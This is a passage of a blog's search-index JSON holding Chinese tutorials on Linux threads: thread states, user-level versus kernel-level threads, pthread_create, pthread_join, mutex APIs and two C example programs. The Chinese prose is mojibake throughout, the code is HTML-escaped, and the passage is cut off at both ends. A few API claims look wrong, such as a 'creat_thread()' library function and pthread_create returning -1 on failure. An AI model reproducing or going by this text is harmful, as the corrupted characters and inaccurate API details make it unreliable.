printf(&quot;pthread 1 å·²ç»ç»“æŸ\\n&quot;); &#125; if(thread[1] !=0) &#123; //comment5 pthread_join(thread[1],NULL); printf(&quot;pthread 2 å·²ç»ç»“æŸ\\n&quot;); &#125;&#125;int main()&#123; /*ç”¨é»˜è®¤å±æ€§åˆå§‹åŒ–äº’æ–¥é”*/ pthread_mutex_init(&amp;mutex_0,NULL); pthread_mutex_init(&amp;mutex_1,NULL); printf(&quot;æˆ‘æ˜¯ä¸»å‡½æ•°å“¦ï¼Œæˆ‘æ­£åœ¨åˆ›å»ºçº¿ç¨‹\\n&quot;); thread_create(); printf(&quot;æˆ‘æ˜¯ä¸»å‡½æ•°å“¦ï¼Œæˆ‘æ­£åœ¨ç­‰å¾…çº¿ç¨‹å®Œæˆä»»åŠ¡\\n&quot;); thread_wait(); return 0;&#125;","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘8-Linux çº¿ç¨‹æ¦‚è¿°","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘8-Linux çº¿ç¨‹æ¦‚è¿°/","text":"æ¦‚è¿°ï¼šçŸ¥è¯†ç‚¹ Linux çº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µ Linux å…±äº«å†…å­˜ç›¸å…³ API ä»‹ç» 0x01 Linux çº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µ Linux æ“ä½œç³»ç»Ÿå¼•å…¥çº¿ç¨‹ä¸»è¦æ˜¯ä¸ºäº†æé«˜ç³»ç»Ÿçš„æ‰§è¡Œæ•ˆç‡ï¼Œå‡å°‘å¤„ç†æœºçš„ç©ºè½¬æ—¶é—´å’Œåœ¨è¿›è¡Œè°ƒåº¦åˆ‡æ¢æ—¶å› ä¿æŠ¤ç°åœºä¿¡æ¯æ‰€ç”¨çš„æ—¶é—´ï¼Œä¾¿äºç³»ç»Ÿç®¡ç†ã€‚ çº¿ç¨‹ï¼ˆThreadsï¼‰æ˜¯è¿›ç¨‹ä¸­æ‰§è¡Œè¿ç®—çš„æœ€å°å•ä½ï¼Œå³æ‰§è¡Œå¤„ç†æœºè°ƒåº¦çš„åŸºæœ¬ä»£ä¸ºã€‚åœ¨ Linux æ“ä½œç³»ç»Ÿä¸­ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªè¿›ç¨‹å†…éƒ¨è¿›è¡Œçº¿ç¨‹åˆ‡æ¢ï¼Œç°åœºä¿æŠ¤å·¥ä½œé‡å°ï¼Œå¹¶ä¸”é€šè¿‡å…±äº«çº¿ç¨‹çš„åŸºæœ¬èµ„æºå¯ä»¥å‡è½»ç³»ç»Ÿå¼€é”€ã€‚æ­¤å¤–ï¼Œè¿›ç¨‹ä¸­çº¿ç¨‹çš„åˆ‡æ¢ä¹Ÿèƒ½æé«˜ç°åœºåˆ‡æ¢çš„æ•ˆç‡ã€‚å› æ­¤ï¼Œä¸€ä¸ªè¿›ç¨‹å†…çš„åŸºæœ¬è°ƒåº¦å•ä½ç§°ä¸ºçº¿ç¨‹æˆ–è½»å‹çº¿ç¨‹ï¼Œè¿™ä¸ªè°ƒåº¦å•ä½æ—¢å¯ä»¥ç”±æ“ä½œç³»ç»Ÿå†…æ ¸æ§åˆ¶ï¼Œä¹Ÿå¯ä»¥ç”±ç”¨æˆ·ç¨‹åºæ§åˆ¶ã€‚ä¸‹é¢å°±å°†å‰é¢æ‰€å­¦åˆ°çš„è¿›ç¨‹ä¸çº¿ç¨‹è¿›è¡Œæ¯”è¾ƒæ¥è¿›ä¸€æ­¥ç†è§£çº¿ç¨‹çš„æ¦‚å¿µï¼š è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿèµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ã€‚æ‰€æœ‰ä¸è¯¥è¿›ç¨‹æœ‰å…³çš„èµ„æºï¼Œå¦‚å¤–éƒ¨è®¾å¤‡ã€ç¼“å†²åŒºé˜Ÿåˆ—ç­‰ï¼Œéƒ½è¢«è®°å½•åœ¨è¿›ç¨‹æ§åˆ¶å— PCB ä¸­ï¼Œä»¥è¡¨ç¤ºè¯¥è¿›ç¨‹æ‹¥æœ‰è¿™äº›èµ„æºã€‚åŒä¸€è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹å…±äº«è¯¥è¿›ç¨‹çš„æ‰€æœ‰èµ„æºã€‚ çº¿ç¨‹æ˜¯åˆ†é…å¤„ç†æœºçš„åŸºæœ¬å•ä½ã€‚å®ƒä¸èµ„æºåˆ†é…æ— å…³ï¼Œå³çœŸæ­£åœ¨å¤„ç†æœºä¸Šè¿è¡Œçš„æ˜¯çº¿ç¨‹ã€‚ ä¸€ä¸ªçº¿ç¨‹åªèƒ½å±äºä¸€ä¸ªè¿›ç¨‹ï¼Œè€Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥æ‹¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä½†è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚ çº¿ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­éœ€è¦åä½œåŒæ­¥ï¼Œä¸åŒè¿›ç¨‹çš„çº¿ç¨‹é—´è¦åˆ©ç”¨æ¶ˆæ¯é€šä¿¡çš„æ–¹å¼å®ç°åŒæ­¥ï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰ã€‚ è™½ç„¶ä¸Šé¢åˆ—å‡ºäº†å¾ˆå¤šçº¿ç¨‹ä¸è¿›ç¨‹çš„åŒºåˆ«ï¼Œä½†æ˜¯åœ¨ Linux æ“ä½œç³»ç»Ÿä¸­å¹¶æ²¡æœ‰è¿›è¡Œå¤ªå¤šåŒºåˆ†ï¼Œå¯¹è¿›ç¨‹å’Œçº¿ç¨‹éƒ½ç”¨äº†ç›¸åŒçš„æè¿°æ–¹æ³•ä»¥åŠç›¸åŒçš„è°ƒåº¦å’Œç®¡ç†ç­–ç•¥ã€‚ 0x02 Linux çº¿ç¨‹çš„çŠ¶æ€ Linux æ“ä½œç³»ç»Ÿä¸­ï¼Œçº¿ç¨‹ä¸è¿›ç¨‹ä¸€æ ·ï¼Œä¹Ÿæœ‰è‡ªå·±çš„çŠ¶æ€ã€‚çº¿ç¨‹æœ‰ä¸‰ç§åŸºæœ¬çŠ¶æ€ï¼Œå³æ‰§è¡Œã€é˜»å¡å’Œå°±ç»ªï¼Œæ²¡æœ‰è¿›ç¨‹çŠ¶æ€ä¸­çš„æŒ‚èµ·çŠ¶æ€ã€‚å› æ­¤ï¼Œçº¿ç¨‹æ˜¯ä¸€ä¸ªåªä¸å†…å­˜å’Œå¯„å­˜å™¨ç›¸å…³çš„æ¦‚å¿µï¼Œå†…å®¹ä¸ä¼šå› ä¸ºäº¤æ¢è€Œè¿›å…¥å†…å­˜ã€‚ é’ˆå¯¹çº¿ç¨‹çš„ä¸‰ç§çŠ¶æ€ï¼Œç³»ç»Ÿä¸­å­˜åœ¨äº”ç§åŸºæœ¬æ“ä½œæ¥è½¬æ¢çº¿ç¨‹çŠ¶æ€ï¼š æ´¾ç”Ÿï¼šçº¿ç¨‹åœ¨è¿›ç¨‹ä¸­æ´¾ç”Ÿå‡ºæ¥ï¼Œä¹Ÿå¯å†æ´¾ç”Ÿçº¿ç¨‹ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨æ´¾ç”Ÿè‡ªå·±çš„çº¿ç¨‹ã€‚åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œåº“å‡½æ•° clone() å’Œ creat_thread() åˆ†åˆ«ç”¨æ¥æ´¾ç”Ÿä¸åŒæ‰§è¡Œæ¨¡å¼ä¸‹çš„çº¿ç¨‹ã€‚æ–°æ´¾ç”Ÿçš„çº¿ç¨‹å…·æœ‰ç›¸åº”çš„æ•°æ®ç»“æ„æŒ‡é’ˆå’Œå˜é‡ï¼Œè¿™äº›æŒ‡é’ˆå’Œå˜é‡ä½œä¸ºå¯„å­˜å™¨ä¸Šä¸‹æ–‡æ”¾åœ¨æœ¬çº¿ç¨‹çš„å¯„å­˜å™¨å’Œå †æ ˆä¸­ã€‚æ–°æ´¾ç”Ÿçš„çº¿ç¨‹è¢«æ”¾å…¥å°±ç»ªé˜Ÿåˆ—ã€‚ è°ƒåº¦ï¼šé€‰æ‹©ä¸€ä¸ªå°±ç»ªçº¿ç¨‹è¿›å…¥æ‰§è¡ŒçŠ¶æ€ã€‚ é˜»å¡ï¼šåƒè¿›ç¨‹ä¸€æ ·ï¼Œå¦‚æœä¸€ä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­éœ€è¦ç­‰å¾…æŸä¸ªäº‹ä»¶å‘ç”Ÿï¼Œåˆ™è¢«é˜»å¡ï¼Œé˜»å¡æ—¶ï¼Œå¯„å­˜å™¨ä¸Šä¸‹æ–‡ã€ç¨‹åºè®¡æ•°å™¨ä»¥åŠå †æ ˆæŒ‡é’ˆéƒ½ä¼šå¾—åˆ°ä¿å­˜ã€‚ æ¿€æ´»ï¼šå¦‚æœé˜»å¡çº¿ç¨‹æ‰€ç­‰å¾…çš„äº‹ä»¶å‘ç”Ÿï¼Œåˆ™è¯¥çº¿ç¨‹è¢«æ¿€æ´»å¹¶è¿›å…¥å°±ç»ªé˜Ÿåˆ—ã€‚ ç»“æŸï¼šå¦‚æœä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œç»“æŸï¼Œå®ƒçš„å¯„å­˜å™¨ä¸Šä¸‹æ–‡ä»¥åŠå †æ ˆå†…å®¹ç­‰å°†è¢«é‡Šæ”¾ã€‚ 0x03 å¼•å…¥çº¿ç¨‹çš„ä¼˜åŠ¿ å¤šçº¿ç¨‹æœºåˆ¶æ˜¯æŒ‡æ“ä½œç³»ç»Ÿæ”¯æŒåœ¨ä¸€ä¸ªè¿›ç¨‹å†…è‡ªè¡Œå¤šä¸ªçº¿ç¨‹çš„èƒ½åŠ›ã€‚ä»çº¿ç¨‹çš„è§‚ç‚¹åˆ†æï¼ŒMS-DOS ä»…æ”¯æŒä¸€ä¸ªç”¨æˆ·è¿›ç¨‹å’Œä¸€ä¸ªçº¿ç¨‹ï¼›UNIX ç³»ç»Ÿæ”¯æŒå¤šä¸ªç”¨æˆ·è¿›ç¨‹ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼›WindowsNT ã€Solaris ã€ Linux ç­‰æ”¯æŒå¤šè¿›ç¨‹å¤šçº¿ç¨‹ã€‚ è™½ç„¶å¤šç§ç³»ç»Ÿéƒ½æ”¯æŒå¤šçº¿ç¨‹ï¼Œä½†æ˜¯å®ç°çš„æ–¹å¼ä¹Ÿä¸ç›¸åŒã€‚çº¿ç¨‹æœ‰ä¸¤ä¸ªåŸºæœ¬ç±»å‹ï¼š ç”¨æˆ·çº§çº¿ç¨‹ ç³»ç»Ÿçº§çº¿ç¨‹ï¼ˆæ ¸å¿ƒçº§çº¿ç¨‹ï¼‰ ç”¨æˆ·çº§çº¿ç¨‹ ç”¨æˆ·çº§çº¿ç¨‹ç®€ç§°ä¸º ULT ï¼Œç”±ç”¨æˆ·åº”ç”¨ç¨‹åºå»ºç«‹çš„ï¼Œå¹¶ç”±ç”¨æˆ·åº”ç”¨ç¨‹åºè´Ÿè´£å¯¹è¿™äº›çº¿ç¨‹è¿›è¡Œè°ƒåº¦å’Œç®¡ç†ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸å¹¶ä¸çŸ¥é“æœ‰ç”¨æˆ·çº§çº¿ç¨‹çš„å­˜åœ¨ï¼Œåªå¯¹è¿›ç¨‹è¿›è¡Œç®¡ç†ã€‚å› æ­¤è¿™ç§çº¿ç¨‹ä¸å†…æ ¸æ— å…³ã€‚MS-DOS å’Œ UNIX æ“ä½œç³»ç»Ÿä¸‹çº¿ç¨‹å°±å±äºè¿™ç§ã€‚ è¿™ç§çº¯ ULT æ–¹æ³•çš„ä¼˜ç‚¹å¦‚ä¸‹ï¼š åº”ç”¨ç¨‹åºä¸­çº¿ç¨‹çš„å¼€å…³çš„æ—¶ç©ºå¼€ç®±è¿œè¿œå°äºå†…æ ¸çº§çº¿ç¨‹çš„å¼€é”€ çº¿ç¨‹çš„è°ƒåº¦ç®—æ³•ä¸æ“ä½œç³»ç»Ÿçš„è°ƒåº¦ç®—æ³•æ— å…³ ç”¨æˆ·çº§çº¿ç¨‹æ–¹æ³•é€‚ç”¨äºä»»ä½•æ“ä½œç³»ç»Ÿï¼Œå› ä¸ºä¸å†…æ ¸æ— å…³ ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå¦‚ä¸‹ï¼š åœ¨ä¸€ä¸ªå…¸å‹çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œæœ‰è®¸å¤šç³»ç»Ÿè¯·æ±‚æ­£è¢«é˜»å¡ç€ï¼Œå› æ­¤ï¼Œå½“çº¿ç¨‹æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿè¯·æ±‚æ—¶ï¼Œä¸ä»…æœ¬çº¿ç¨‹é˜»å¡ï¼Œè€Œä¸”è¯¥çº¿ç¨‹æ‰€åœ¨è¿›ç¨‹ä¸­çš„æ‰€æœ‰çº¿ç¨‹éƒ½ä¼šè¢«é˜»å¡ åœ¨è¯¥æ–¹æ³•çš„ç³»ç»Ÿä¸­ï¼Œå› ä¸ºæ¯ä¸ªè¿›ç¨‹æ¯æ¬¡åªèƒ½ç”±ä¸€ä¸ªçº¿ç¨‹åœ¨ CPU ä¸­è¿è¡Œï¼Œå› æ­¤ï¼Œä¸€ä¸ªçº¿ç¨‹åº”ç”¨æ— æ³•åˆ©ç”¨å¤šå¤„ç†å™¨çš„ä¼˜ç‚¹ã€‚ å†…æ ¸çº§çº¿ç¨‹ å†…æ ¸çº§çº¿ç¨‹ç®€ç§°ä¸º KLT ã€‚å†…æ ¸çº§çº¿ç¨‹ä¸­æ‰€æœ‰çº¿ç¨‹çš„åˆ›å»ºã€è°ƒåº¦å’Œç®¡ç†å…¨éƒ¨ç”±æ“ä½œç³»ç»Ÿå†…æ ¸è´Ÿè´£å®Œæˆã€‚ä¸€ä¸ªåº”ç”¨è¿›ç¨‹å¯æŒ‰å¤šçº¿ç¨‹æ–¹å¼ç¼–å†™ç¨‹åºï¼Œå½“å®ƒè¢«æäº¤ç»™å¤šçº¿ç¨‹æ“ä½œç³»ç»Ÿè¿è¡Œæ—¶ï¼Œå†…æ ¸ä¸ºå®ƒåˆ›å»ºä¸€ä¸ªè¿›ç¨‹å’Œä¸€ä¸ªçº¿ç¨‹ï¼Œçº¿ç¨‹åœ¨è¿è¡Œä¸­è¿˜ä¼šåˆ›å»ºæ–°çš„çº¿ç¨‹ã€‚æ“ä½œç³»ç»Ÿå†…æ ¸ç»™åº”ç”¨ç¨‹åºæä¾›ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨å’Œåº”ç”¨ç¨‹åºæ¥å£ï¼Œä»¥ä½¿ç”¨æˆ·ç¨‹åºå¯ä»¥åˆ›å»ºã€æ‰§è¡Œã€æ’¤é”€çº¿ç¨‹ã€‚è¿™ç§å†…æ ¸çº§çº¿ç¨‹çš„ä¼˜ç‚¹å¦‚ä¸‹ï¼š å†…æ ¸å¯ä»¥è°ƒåº¦ä¸€ä¸ªè¿›ç¨‹ä¸­çš„çº¿ç¨‹ï¼Œä½¿å…¶åŒæ—¶åœ¨å¤šä¸ªå¤„ç†æœºä¸Šå¹¶è¡Œè¿è¡Œï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„æ•ˆç‡ å½“è¿›ç¨‹ä¸­çš„ä¸€ä¸ªçº¿ç¨‹è¢«é˜»å¡æ—¶ï¼Œè¿›ç¨‹ä¸­çš„å…¶ä»–çº¿ç¨‹ä»ç„¶å¯è¿è¡Œ å†…æ ¸æœ¬èº«å¯ä»¥ä»¥çº¿ç¨‹æ–¹å¼å®ç° ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œç”±äºçº¿ç¨‹è°ƒåº¦ç¨‹åºè¿è¡Œåœ¨å†…æ ¸æ€ï¼Œè€Œåº”ç”¨ç¨‹åºè¿è¡Œåœ¨ç”¨æˆ·æ€ï¼Œå› æ­¤åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„çº¿ç¨‹åˆ‡æ¢è¦ç»è¿‡ç”¨æˆ·æ€åˆ°å†…æ ¸æ€ï¼Œå†ä»å†…æ ¸æ€åˆ°ç”¨æˆ·æ€çš„ä¸¤æ¬¡æ¨¡å¼è£…æ¢ã€‚ ç”¨æˆ·çº§çº¿ç¨‹ä¸æ ¸å¿ƒæœºçº¿ç¨‹ç›¸ç»“åˆçš„æ¨¡å¼ ç”±äºç”¨æˆ·çº§çº¿ç¨‹å’Œå†…æ ¸çº§çº¿ç¨‹å„æœ‰ç‰¹ç‚¹ï¼Œå› æ­¤ï¼Œå¦‚æœå°†ä¸¤ç§æ–¹å¼ç›¸ç»“åˆèµ·æ¥ï¼Œåˆ™å¯ä»¥å¸å–ä¸¤è€…çš„ä¼˜ç‚¹ï¼Œç»“åˆèµ·æ¥çš„ç³»ç»Ÿç§°ä¸ºå¤šçº¿ç¨‹çš„æ“ä½œç³»ç»Ÿã€‚å†…æ ¸æ”¯æŒå¤šçº¿ç¨‹çš„å»ºç«‹ã€è°ƒåº¦å’Œç®¡ç†ã€‚åŒæ—¶ç³»ç»Ÿä¸­åˆæä¾›ä½¿ç”¨çº¿ç¨‹åº“ï¼Œå…è®¸ç”¨æˆ·åº”ç”¨ç¨‹åºå»ºç«‹ã€è°ƒåº¦å’Œç®¡ç†ç”¨æˆ·çº§çº¿ç¨‹ã€‚ Linux çš„å†…æ ¸çº§çº¿ç¨‹å’Œå…¶ä»–æ“ä½œç³»ç»Ÿçš„å†…æ ¸å®ç°ä¸åŒã€‚å¤§å¤šæ•°æ“ä½œç³»ç»Ÿå•ç‹¬å®šä¹‰æè¿°çº¿ç¨‹çš„æ•°æ®ç»“æ„ï¼Œé‡‡ç”¨å•ç‹¬çš„çº¿ç¨‹ç®¡ç†æ–¹å¼ï¼Œæä¾›ä¸“é—¨çš„çº¿ç¨‹è°ƒåº¦ï¼Œè¿™äº›éƒ½å¢åŠ äº†å†…æ ¸å’Œè°ƒåº¦ç¨‹åºçš„å¤æ‚æ€§ã€‚è€Œåœ¨ Linux ä¸­ï¼Œå°†çº¿ç¨‹å®šä¹‰ä¸ºâ€œæ‰§è¡Œä¸Šä¸‹æ–‡â€ï¼Œå®ƒå®é™…ä¸Šåªæ˜¯è¿›ç¨‹çš„å¦å¤–æ‰§è¡Œä¸Šä¸‹æ–‡è€Œå·²ï¼Œå’Œè¿›ç¨‹é‡‡ç”¨åŒæ ·çš„è¡¨ç¤ºã€ç®¡ç†ã€è°ƒåº¦æ–¹å¼ã€‚è¿™æ ·ï¼ŒLinux å†…æ ¸å¹¶ä¸éœ€è¦åŒºåˆ†çº¿ç¨‹å’Œè¿›ç¨‹ï¼Œåªéœ€è¦ä¸€ä¸ªè¿›ç¨‹/çº¿ç¨‹ç®¡ç†æ•°ç»„ï¼Œè€Œä¸”è°ƒåº¦ç¨‹åºä¹Ÿåªæœ‰è¿›ç¨‹çš„è°ƒåº¦ç¨‹åºï¼Œå†…æ ¸çš„å®ç°ç›¸å¯¹ç®€å•å¾—å¤šï¼Œè€Œä¸”èŠ‚çº¦ç³»ç»Ÿç”¨äºç®¡ç†æ–¹é¢çš„æ—¶é—´å¼€é”€ã€‚ 0x04 Linuxçº¿ç¨‹ç›¸å…³ API å‡½æ•° Linux ç³»ç»Ÿä¸‹çš„å¤šçº¿ç¨‹éµå¾ª POSIX çº¿ç¨‹æ¥å£ï¼Œç§°ä¸º pthread ï¼Œç¼–å†™ Linux ä¸‹çš„å¤šçº¿ç¨‹ç¨‹åºéœ€è¦ä½¿ç”¨å¤´æ–‡ä»¶ pthread.h ï¼Œç¼–è¯‘æ—¶éœ€è¦ä½¿ç”¨ -pthread é“¾æ¥ä½¿ç”¨åº“ libpthread.aï¼Œåˆ›å»ºçº¿ç¨‹çš„å‡½æ•°æ¥å£æ˜¯ pthread_create ï¼Œå…·ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910111213141516171819202122232425#include &lt;pthread.h&gt;int pthread_create(pthread_t *restrict thread, const pthread_attr_t *restrict attr, void *(*start_routine)(void*), void *restrict arg);/*å‚æ•°ï¼š threadï¼šè´Ÿè´£å‘è°ƒç”¨è€…ä¼ é€’å­çº¿ç¨‹çš„çº¿ç¨‹å· attrï¼šè´Ÿè´£æ§åˆ¶çº¿ç¨‹çš„å„ç§å±æ€§ï¼Œå…·ä½“ä¼šç”¨åˆ°å±æ€§è®¾ç½®ç»“æ„ä½“ pthread_attr_tï¼Œå¦‚ä¸‹ï¼š typedef struct &#123; int detachstate; //çº¿ç¨‹çš„åˆ†ç¦»çŠ¶æ€ int schedpolicy; //çº¿ç¨‹è°ƒåº¦ç­–ç•¥ structsched_param schedparam; //çº¿ç¨‹çš„è°ƒåº¦å‚æ•° int inheritsched; //çº¿ç¨‹çš„ç»§æ‰¿æ€§ int scope; //çº¿ç¨‹çš„ä½œç”¨åŸŸ size_t guardsize; //çº¿ç¨‹æ ˆæœ«å°¾çš„è­¦æˆ’ç¼“å†²åŒºå¤§å° int stackaddr_set; //çº¿ç¨‹å †æ ˆçš„åœ°å€é›† void* stackaddr; //çº¿ç¨‹æ ˆçš„ä½ç½® size_t stacksize; //çº¿ç¨‹æ ˆçš„å¤§å° &#125;pthread_attr_t; start_routineï¼šè¿™ä¸ªå‚æ•°è´Ÿè´£æŒ‡å®šå­çº¿ç¨‹éœ€è¦å…è®¸çš„å‡½æ•°ï¼Œè¿™ä¸ªå‚æ•°éœ€è¦ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚ argï¼šå‚æ•°æŒ‡å®šå­çº¿ç¨‹è¿è¡Œå‡½æ•°æ‰€éœ€çš„å‚æ•°å€¼ã€‚è¿”å›å€¼ï¼š æˆåŠŸè¿”å› 0ï¼Œè¯†åˆ«è¿”å› -1*/ çº¿ç¨‹é€€å‡ºå‡½æ•° pthread_exit(void *retval) ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 12345678#include &lt;pthread.h&gt;void pthread_exit(void *retval);/*å‚æ•°ï¼š retvalï¼šç•™ç»™ä¸»çº¿ç¨‹å›æ”¶ä½¿ç”¨çš„é€€å‡ºçŠ¶æ€å€¼*/ ä¸»çº¿ç¨‹å›æ”¶å­çº¿ç¨‹èµ„æºå‡½æ•° pthread_join()ï¼Œå½“è°ƒç”¨ pthread_join() æ—¶ï¼Œå½“å‰çº¿ç¨‹ä¼šå¤„äºé˜»å¡çŠ¶æ€ï¼Œç›´åˆ°è¢«è°ƒç”¨çš„çº¿ç¨‹ç»“æŸåï¼Œå½“å‰çº¿ç¨‹æ‰ä¼šé‡æ–°å¼€å§‹æ‰§è¡Œã€‚å½“ pthread_join() å‡½æ•°è¿”å›åï¼Œè¢«è°ƒç”¨çº¿ç¨‹æ‰ç®—çœŸæ­£æ„ä¹‰ä¸Šçš„ç»“æŸï¼Œå†…å­˜ç©ºé—´æ‰ä¼šè¢«é‡Šæ”¾ï¼ˆå¦‚æœè¢«è°ƒç”¨çº¿ç¨‹æ˜¯éåˆ†ç¦»æƒ…å†µä¸‹ï¼‰ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 1234567891011#include &lt;pthread.h&gt;int pthread_join(pthread_t th, void **thread_return);/*å‚æ•°ï¼š thï¼šè¢«è¿æ¥çº¿ç¨‹çš„çº¿ç¨‹å· thread_returnï¼šæŒ‡å‘ä¸€ä¸ªè¢«è¿æ¥çº¿ç¨‹çš„è¿”å›ç çš„æ¥æ”¶ä½ç½®è¿”å›å€¼ï¼š æˆåŠŸè¿”å› 0ï¼Œå¤±è´¥è¿”å›ä¸€ä¸ª error number*/ å¤šçº¿ç¨‹ç¨‹åºä¸­å¯èƒ½ä¼šå­˜åœ¨æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µï¼Œé‚£ä¹ˆå¦‚ä½•ä¿è¯æ•°æ®ä¸€è‡´å‘¢ï¼Ÿå¯ä»¥è€ƒè™‘åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹è®¿é—®æ•°æ®ã€‚äº’æ–¥é‡(mutex)å°±æ˜¯ä¸€æŠŠé”ã€‚å¤šä¸ªçº¿ç¨‹åªæœ‰ä¸€æŠŠé”ä¸€ä¸ªé’¥åŒ™ï¼Œè°ä¸Šçš„é”å°±åªæœ‰è°èƒ½å¼€é”ã€‚å½“ä¸€ä¸ªçº¿ç¨‹è¦è®¿é—®ä¸€ä¸ªå…±äº«å˜é‡æ—¶ï¼Œå…ˆç”¨é”æŠŠå˜é‡é”ä½ï¼Œç„¶åå†æ“ä½œï¼Œæ“ä½œå®Œäº†ä¹‹åå†é‡Šæ”¾æ‰é”ï¼Œå®Œæˆã€‚å½“å¦ä¸€ä¸ªçº¿ç¨‹ä¹Ÿè¦è®¿é—®è¿™ä¸ªå˜é‡æ—¶ï¼Œå‘ç°è¿™ä¸ªå˜é‡è¢«é”ä½äº†ï¼Œæ— æ³•è®¿é—®ï¼Œå®ƒå°±ä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°é”æ²¡äº†ï¼Œå®ƒå†ç»™è¿™ä¸ªå˜é‡ä¸Šä¸ªé”ï¼Œç„¶åä½¿ç”¨ï¼Œä½¿ç”¨å®Œäº†é‡Šæ”¾é”ï¼Œä»¥æ­¤è¿›è¡Œã€‚è¿™ä¸ªå³ä½¿æœ‰å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®è¿™ä¸ªå˜é‡ï¼Œä¹Ÿå¥½è±¡æ˜¯å¯¹è¿™ä¸ªå˜é‡çš„æ“ä½œæ˜¯é¡ºåºè¿›è¡Œçš„ã€‚ äº’æ–¥å˜é‡ä½¿ç”¨ç‰¹å®šçš„æ•°æ®ç±»å‹ï¼špthread_mutex_tï¼Œä½¿ç”¨äº’æ–¥é‡å‰è¦å…ˆåˆå§‹åŒ–ï¼Œä½¿ç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š 12345678910#include &lt;pthread.h&gt;int pthread_mutex_init(pthread_mutex_t *restrict mutex, const pthread_mutexattr_t *restrict attr);int pthread_mutex_destroy(pthread_mutex_t *mutex);//å¯¹äº’æ–¥é‡åŠ é”è§£é”çš„å‡½æ•°å¦‚ä¸‹ï¼šint pthread_mutex_lock(pthread_mutex_t *mutex);int pthread_mutex_trylock(pthread_mutex_t *mutex);int pthread_mutex_unlock(pthread_mutex_t *mutex); å¯¹äºçº¿ç¨‹é”çš„ç›¸å…³ä»‹ç»æœ‰å¾ˆå¤šï¼Œåé¢æœ‰æœºä¼šå’±ä»¬è¯¦ç»†ä»‹ç»ä¸€ä¸‹ã€‚è¿™é‡Œå…ˆæš‚æ—¶äº†è§£éƒ¨åˆ†ç”¨äºçº¿ç¨‹åŒæ­¥ä½¿ç”¨ã€‚ 0x05 å®éªŒä¸€ï¼šLinux çº¿ç¨‹åˆ›å»º 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;void *mythread1(void)&#123; int i; for(i = 0; i &lt; 10; i++) &#123; printf(&quot;This is the 1st pthread,created by xiaoqiang!\\n&quot;); sleep(1); &#125;&#125;void *mythread2(void)&#123; int i; for(i = 0; i &lt; 10; i++) &#123; printf(&quot;This is the 2st pthread,created by xiaoqiang!\\n&quot;); sleep(1); &#125;&#125;int main(int argc, const char *argv[])&#123; int i = 0; int ret = 0; pthread_t id1,id2; ret = pthread_create(&amp;id1, NULL, (void *)mythread1,NULL); if(ret) &#123; printf(&quot;Create pthread error!\\n&quot;); return 1; &#125; ret = pthread_create(&amp;id2, NULL, (void *)mythread2,NULL); if(ret) &#123; printf(&quot;Create pthread error!\\n&quot;); return 1; &#125; pthread_join(id1,NULL); pthread_join(id2,NULL); return 0;&#125; 0x06 å®éªŒäºŒï¼šLinux çº¿ç¨‹åŒæ­¥é—®é¢˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/time.h&gt;#include &lt;string.h&gt;#define MAX 10pthread_t thread[2]; //ä¸¤ä¸ªçº¿ç¨‹pthread_mutex_t mut;int number=0;int i;void *thread1()&#123; printf (&quot;thread1 : I&#x27;m thread 1\\n&quot;); for (i = 0; i &lt; MAX; i++) 